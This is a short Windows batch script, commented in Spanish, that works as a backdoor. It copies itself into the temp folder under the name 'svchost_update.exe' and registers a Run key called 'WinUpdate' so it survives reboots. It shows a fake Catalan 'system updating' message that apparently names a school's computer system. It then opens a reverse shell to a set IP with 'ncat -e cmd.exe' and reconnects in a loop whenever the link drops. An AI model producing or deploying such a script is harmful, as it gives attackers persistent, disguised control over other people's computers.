@echo off
setlocal

REM --- CONFIGURACIÓN ---
REM Pon aquí la IP de TU ordenador (la que tiene el netcat escuchando)
SET TARGET_IP=192.168.1.19 
SET PORT=4444
REM ---------------------

:install
REM Persistencia: Copiar a %TEMP% y registrar
if exist "%temp%\svchost_update.exe" goto :run
copy "%~f0" "%temp%\svchost_update.exe" >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinUpdate /t REG_SZ /d "%temp%\svchost_update.exe" /f >nul
echo Sistema Natiu d'Ordinadors del Provençana - Actualitzant, no tancar la finestra.

:run
REM Conexión con Netcat
rem Si no tienes nc.exe en PATH, pon la ruta completa a él, ej: C:\tools\netcat\nc.exe
ncat -e cmd.exe %TARGET_IP% %PORT% 

rem Si se cae, reiniciar conexión
goto :run